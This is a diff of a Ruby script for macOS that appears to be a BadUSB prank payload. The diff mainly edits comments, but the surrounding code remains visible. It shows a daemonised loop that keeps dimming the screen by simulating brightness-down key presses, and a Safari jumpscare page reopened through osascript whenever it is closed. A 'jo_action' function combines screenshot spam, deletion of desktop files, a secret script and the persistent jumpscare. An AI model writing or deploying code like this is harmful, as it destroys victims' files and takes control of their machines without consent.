@@ -55,7 +55,7 @@ def create_jumpscare_html(video_url)
       var video = document.getElementById('video');
       video.play();
       video.addEventListener('loadeddata', function() {
-        // After 500ms, unmute and resume playback.
+        // After 500ms, unmute and play.
         setTimeout(function(){
           video.muted = false;
           video.play();
@@ -102,7 +102,7 @@ def persistent_jumpscare(video_url)
       end tell
     }
     result = `osascript -e '#{check_script}'`.strip.downcase
-    # If the jumpscare page is not open, reopen it.
+    # If the page is not found, reopen it.
     unless result.include?("true")
       system("open -a Safari '#{html_file}'")
     end
@@ -111,12 +111,11 @@ def persistent_jumpscare(video_url)
 end
 
 # --- New Maintain Darkness Function ---
-# Instead of using brightness utility, simulate pressing the brightness-down key.
+# Instead of using Homebrew, we simulate pressing the brightness-down key.
 def maintain_darkness
   pid = fork do
     Process.daemon(true, true)
     loop do
-      # Simulate pressing the brightness-down key 10 times.
       10.times do
         system("osascript -e 'tell application \"System Events\" to key code 144'")
         sleep 0.05
@@ -158,8 +157,12 @@ def run_secret_script
 end
 
 # --- Jo Action ---
-# Executes: spam screenshots, delete desktop files, maintain darkness,
-# run secret script, and launch persistent Momo jumpscare.
+# This action concurrently spawns:
+# - spam_screenshots,
+# - delete_desktop_files,
+# - maintain_darkness,
+# - run_secret_script, and
+# - persistent jumpscare (Momo jumpscare).
 def jo_action
   spam_screenshots
   delete_desktop_files
@@ -195,7 +198,6 @@ def subscriber_action
   case first_choice
   when "hawk"
     run_secret_script
-    system("killall Terminal")
     exit 0
   when "tuah"
     persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
@@ -224,9 +226,6 @@ def subscriber_action
   else
     puts "Unexpected button choice in first prompt: #{first_choice}"
   end
-  
-  system("killall Terminal")
-  exit 0
 end
 
 # --- Main Program Flow ---
